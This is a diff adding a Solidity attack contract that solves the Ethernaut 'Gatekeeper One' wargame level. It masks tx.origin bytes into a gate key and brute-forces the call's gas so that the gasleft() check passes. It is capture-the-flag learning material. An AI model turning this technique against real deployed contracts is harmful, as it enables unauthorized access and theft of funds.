@@ -1,1 +1,38 @@
 
+// SPDX-License-Identifier: MIT
+/*Make it past the gatekeeper and register as an entrant to pass this level.
+
+Things that might help:
+Remember what you've learned from the Telephone and Token levels.
+You can learn more about the special function gasleft(), in Solidity's documentation (see Units and Global Variables and External Function Calls).
+*/
+
+pragma solidity ^0.8.0;
+
+interface GatekeeperOne{
+    function enter(bytes8 _gateKey) external returns (bool);
+}
+
+contract GatekeeperAttack {
+
+    bytes8 txOrigin16 = 0x22dec11590dfa4bD; //mylast16 digits
+    bytes8 key = txOrigin16 & 0xFFFFFFFF0000FFFF; 
+    GatekeeperOne public gatekeeperone;
+
+    constructor (address _addressToAttack) {
+        gatekeeperone = GatekeeperOne(_addressToAttack);
+    }
+    
+    function attack() public{
+        //brute forcing gate 2
+         for (uint256 i = 0; i < 120; i++) {
+         (bool result, bytes memory data) = address(gatekeeperone).call{gas:
+          i + 150 + 8191*3}( //calculating gate 3
+          abi.encodeWithSignature("enter(bytes8)", key)); // thanks to Spalladino https://github.com/OpenZeppelin/ethernaut/blob/solidity-05/contracts/attacks/GatekeeperOneAttack.sol
+      if(result)
+        {
+        break;
+      }
+    }
+  }
+}
